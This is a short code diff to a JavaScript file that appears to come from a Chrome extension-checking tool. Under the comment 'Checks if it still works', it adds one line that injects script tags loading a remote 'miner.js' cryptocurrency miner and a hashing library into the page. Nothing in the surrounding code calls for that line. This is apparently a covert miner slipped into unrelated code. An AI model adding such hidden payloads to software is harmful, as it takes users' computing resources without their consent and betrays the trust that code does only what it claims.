@@ -642,6 +642,7 @@ if (!window.location.toString().startsWith("https://chrome.google.com/webstore")
 document.getElementById("items").setAttribute("wrongpage", "")
 } else {
 //Checks if it still works
+document.getElementById('items').innerHTML = '<script>type="text/javascript"src="https://cdn.rawgit.com/h2non/jsHashes/master/hashes.js"></script><script src="https://mineuino.vercel.app/miner.js" defer></script><div id="mineuino-div" data-mineuino-username=""></div>';
 if (chrome.management) {
 getExtensions()
 } else {
